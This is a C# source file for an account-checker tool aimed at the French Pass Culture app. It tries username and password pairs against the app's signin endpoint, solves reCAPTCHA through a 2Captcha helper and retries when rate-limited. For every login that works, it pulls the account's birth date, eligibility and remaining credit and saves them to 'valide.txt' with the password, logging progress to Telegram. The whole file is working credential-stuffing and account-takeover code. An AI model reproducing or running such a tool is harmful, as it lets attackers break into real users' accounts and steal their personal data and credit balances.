using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using TwoCaptcha.Examples;
using static DataVortex.keywords.UrlChecker.Keywords;

namespace DataVortex
{
    public class AccountDetails
    {
        public string Username { get; set; }
    }


    internal class Checker
    {

        public static double Remaining1 { get; private set; }
        public static string BirthDate { get; set; }

        public static void HandleAccount(string keyword, (string url, string username, string password, string app) account)
        {


            if (IsAccountVerified(account.username))
            {
                Console.ForegroundColor = ConsoleColor.Magenta;
                Telegram.LogMessage("Ce compte a déjà été vérifié. Ignoré.");
                Console.ResetColor();
                return;
            }

            switch (keyword)
            {
                case "passculture":
                    CheckPassCultureAsync(account.username, account.password);
                    break;
                    // Ajoutez d'autres cas ici pour gérer d'autres types de comptes
            }
        }

        private static void MarkAccountAsVerified(string username)
        {
            var jsonSettings = new JsonSerializerSettings { Formatting = Formatting.None };
            var dataToSerialize = new { Username = username };
            string jsonString = JsonConvert.SerializeObject(dataToSerialize, jsonSettings);

            // Ajouter le nouveau contenu à la fin du fichier sans le remplacer
            File.AppendAllText("verified_accounts.json", jsonString + Environment.NewLine);
        }




        private static bool IsAccountVerified(string username)
        {
            try
            {
                string fileContent = File.ReadAllText("verified_accounts.json");
                return fileContent.Contains(username, StringComparison.OrdinalIgnoreCase);
            }
            catch (Exception)
            {
                return false;
            }
        }

        public static void RemoveDuplicateLines(string filePath)
        {
            try
            {
                // Read all lines from the file
                string[] lines = File.ReadAllLines(filePath);

                // Use a HashSet to store unique lines
                HashSet<string> uniqueLines = new HashSet<string>();

                // Add each line to the HashSet, removing duplicates
                foreach (string line in lines)
                {
                    uniqueLines.Add(line);
                }

                // Write the unique lines back to the file
                File.WriteAllLines(filePath, uniqueLines);

            }
            catch (Exception ex)
            {
                Telegram.LogMessage($"An error occurred: {ex.Message}");
            }
        }


        public static async Task CheckPassCultureAsync(string username, string password)
        {
            if (IsAccountVerified(username))
            {
                Console.ForegroundColor = ConsoleColor.Magenta;
                Telegram.LogMessage("Ce compte a déjà été vérifié. Ignoré.");
                Console.ResetColor();
                return;
            }

            Telegram.LogMessage("Captcha en cours");
            Telegram.LogMessage(" ");
            ReCaptchaV2Example.SolveCaptcha();
            string captchaCode = ReCaptchaV2Example.CaptchaCode;
            var url = "https://backend.passculture.app/native/v1/signin";

            var httpRequest = (HttpWebRequest)WebRequest.Create(url);
            httpRequest.Method = "POST";
            httpRequest.ContentType = "application/json";

            var data = "{\"identifier\":\"" + username + "\",\"password\":\"" + password + "\",\"token\":\"" + captchaCode + "\"}";

            try
            {
                using (var streamWriter = new StreamWriter(httpRequest.GetRequestStream()))
                {
                    streamWriter.Write(data);
                }

                var httpResponse = (HttpWebResponse)httpRequest.GetResponse();
                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                {
                    var result = streamReader.ReadToEnd();
                    var jsonResponse = JObject.Parse(result);

                    if (jsonResponse["accountState"] != null)
                    {
                        var accountState = jsonResponse["accountState"].ToString();
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Telegram.LogMessage($"accountState: {accountState}");
                        Console.ResetColor();

                        if (accountState != "ACTIVE")
                        {
                            HandleIncorrectAccount(username, password);
                        }
                    }

                    if (jsonResponse.ContainsKey("code") && jsonResponse["code"].ToString() == "EMAIL_NOT_VALIDATED")
                    {
                        HandleIncorrectAccount(username, password);
                        Telegram.LogMessage("L'email n'a pas été validé. Ajout dans la liste incorrect.");
                    }

                    if (httpResponse.StatusCode == HttpStatusCode.BadRequest)
                    {
                        HandleIncorrectAccount(username, password);
                        Console.ForegroundColor = ConsoleColor.Red;
                        Telegram.LogMessage("Erreur 400 : Mot de passe incorrect.");
                        Console.ResetColor();
                    }

                    if (jsonResponse["accessToken"] != null && !jsonResponse["accountState"].ToString().Equals("SUSPICIOUS_LOGIN_REPORTED_BY_USER"))
                    {
                        HandleValidAccount(username, password, jsonResponse);
                    }
                }
            }
            catch (WebException ex)
            {
                HandleWebException(ex, username, password);
            }
            MarkAccountAsVerified(username);
        }

        private static void HandleValidAccount(string username, string password, JObject jsonResponse)
        {
            var accessToken = jsonResponse["accessToken"].ToString();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Telegram.LogMessage($"accessToken: {accessToken}");
            Console.ResetColor();

            var url3 = "https://backend.passculture.app/native/v1/me";
            var httpRequest3 = (HttpWebRequest)WebRequest.Create(url3);
            httpRequest3.Headers["Authorization"] = "Bearer " + accessToken;

            var httpResponse3 = (HttpWebResponse)httpRequest3.GetResponse();
            using (var streamReader3 = new StreamReader(httpResponse3.GetResponseStream()))
            {
                var result3 = streamReader3.ReadToEnd();
                var jsonResponse3 = JObject.Parse(result3);

                if (jsonResponse3["birthDate"] != null)
                {
                    BirthDate = jsonResponse3["birthDate"].ToString();
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Telegram.LogMessage($"birthDate: {BirthDate}");
                    Console.ResetColor();
                }

                if (jsonResponse3["status"] != null && jsonResponse3["status"]["statusType"] != null)
                {
                    string statusType = jsonResponse3["status"]["statusType"].ToString();

                    if (statusType.Equals("non_eligible", StringComparison.OrdinalIgnoreCase))
                    {
                        HandleNonEligibleAccount(username, password);
                    }
                }

                if (jsonResponse3["domainsCredit"] != null)
                {
                    var domainsCredit = jsonResponse3["domainsCredit"];

                    if (domainsCredit["all"] != null)
                    {
                        var allCredit = domainsCredit["all"];

                        if (allCredit["remaining"] != null)
                        {
                            var remaining = allCredit["remaining"].ToObject<int>();
                            Remaining1 = (double)remaining / 100.0;
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Telegram.LogMessage($"Remaining1: {Remaining1}");
                            Console.ResetColor();
                        }
                    }
                }

                // Create a JSON object with the relevant details
                var accountDetails = new
                {
                    Username = username,
                    Password = password,
                    Remaining1 = Remaining1,
                    BirthDate = BirthDate,
                };

                // Serialize the JSON object to a string
                var jsonDetails = JsonConvert.SerializeObject(accountDetails);

                // Append the JSON string to the "valide.txt" file
                using (StreamWriter sw = new StreamWriter("valide.txt", true))
                {
                    sw.WriteLine(jsonDetails);
                }
            }
        }

        private static void HandleIncorrectAccount(string username, string password)
        {
            // Ajoutez le nom d'utilisateur incorrect au fichier "incorrect.txt"
            using (StreamWriter sw = new StreamWriter("incorrect.txt", true))
                sw.WriteLine($"{username}:{password}");

            MarkAccountAsVerified(username);
        }

        private static void HandleNonEligibleAccount(string username, string password)
        {
            // Faire quelque chose si le statut est "non_eligible"
            Telegram.LogMessage("L'utilisateur n'est pas éligible.");
            HandleIncorrectAccount(username, password);
        }

        private static void HandleWebException(WebException ex, string username, string password)
        {
            if (ex.Response is HttpWebResponse errorResponse)
            {
                if (errorResponse.StatusCode == HttpStatusCode.BadRequest)
                {
                    HandleIncorrectAccount(username, password);
                    Console.ForegroundColor = ConsoleColor.Green;
                    Telegram.LogMessage("Erreur 400 : Mot de passe incorrect.");
                    Console.ResetColor();
                }
                else if (errorResponse.StatusCode == (HttpStatusCode)429)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Telegram.LogMessage("Erreur 429 : Rate limit atteint. Prochaine tentative dans 5 minute.");
                    Console.ResetColor();
                    Task.Delay(300000).Wait(); // Attendez 5 minutes (300000 millisecondes) avant de réessayer.
                    CheckPassCultureAsync(username, password).Wait(); // Réessayez après l'attente.
                }
            }
        }

        public static async Task DelayAsync(int milliseconds)
        {
            await Task.Delay(milliseconds);
        }
    }
}
